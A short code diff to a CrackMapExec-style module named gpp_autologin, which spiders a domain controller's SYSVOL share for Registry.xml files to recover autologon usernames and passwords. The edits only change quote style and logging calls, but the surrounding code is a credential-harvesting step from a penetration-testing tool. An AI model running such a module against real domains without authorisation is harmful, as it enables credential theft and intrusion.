@@ -5,10 +5,10 @@ import xml.etree.ElementTree as ET
 from io import BytesIO
 
 class CMEModule:
-    '''
+    """
       Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
       Module by @byt3bl33d3r
-    '''
+    """
 
     name = 'gpp_autologin'
     description = 'Searches the domain controller for registry.xml to find autologon information and returns the username and password.'
@@ -17,8 +17,8 @@ class CMEModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        '''
-        '''
+        """
+        """
 
     def on_login(self, context, connection):
         shares = connection.shares()
@@ -26,12 +26,12 @@ class CMEModule:
             if share['name'] == 'SYSVOL' and 'READ' in share['access']:
 
                 context.log.success('Found SYSVOL share')
-                context.log.info('Searching for Registry.xml')
+                context.log.display('Searching for Registry.xml')
 
                 paths = connection.spider('SYSVOL', pattern=['Registry.xml'])
 
                 for path in paths:
-                    context.log.info('Found {}'.format(path))
+                    context.log.display('Found {}'.format(path))
 
                     buf = BytesIO()
                     connection.conn.getFile('SYSVOL', path, buf.write)
